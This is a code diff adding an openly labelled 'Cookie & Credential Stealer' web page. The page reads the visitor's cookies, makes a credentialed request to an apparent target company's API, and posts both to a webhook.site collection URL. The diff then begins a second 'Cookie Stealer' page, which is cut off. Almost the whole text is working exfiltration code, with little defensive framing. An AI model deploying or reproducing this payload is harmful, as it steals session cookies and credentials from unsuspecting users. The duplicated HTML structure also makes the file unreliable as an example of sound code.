@@ -3,6 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cookie & Credential Stealer</title>
+    <script>
+        // Function to send stolen data to the attacker's server
+        function exfiltrateData(data) {
+            fetch("https://webhook.site/c0e8e9d5-f4b5-4666-aba6-b4a814e8cf80", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            });
+        }
+
+        // Collect cookies
+        const cookies = document.cookie;
+
+        // Example: Fetch an auth token or credentials (replace the URL with a target endpoint if needed)
+        fetch("https://api.company-target.com/api/v3/ip.json", {
+            method: "GET",
+            credentials: "include" // Include cookies
+        })
+        .then(response => response.text())
+        .then(apiResponse => {
+            // Exfiltrate cookies and API response
+            exfiltrateData({
+                cookies: cookies,
+                credentials: apiResponse
+            });
+
+            // Optionally display them on the page (for debugging/testing)
+            document.body.innerHTML += `<h2>Cookies:</h2><pre>${cookies}</pre>`;
+            document.body.innerHTML += `<h2>API Response:</h2><pre>${apiResponse}</pre>`;
+        })
+        .catch(err => {
+            // Handle errors
+            exfiltrateData({ error: err.toString() });
+            document.body.innerHTML += `<h2>Error:</h2><pre>${err.toString()}</pre>`;
+        });
+    </script>
+</head>
+<body>
+    <h1>Cookie & Credential Stealer</h1>
+    <p>If you're authenticated, this page will collect your cookies and credentials!</p>
+</body>
+</html>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cookie Stealer</title>
     <script>
         // Send a request with credentials to the vulnerable endpoint
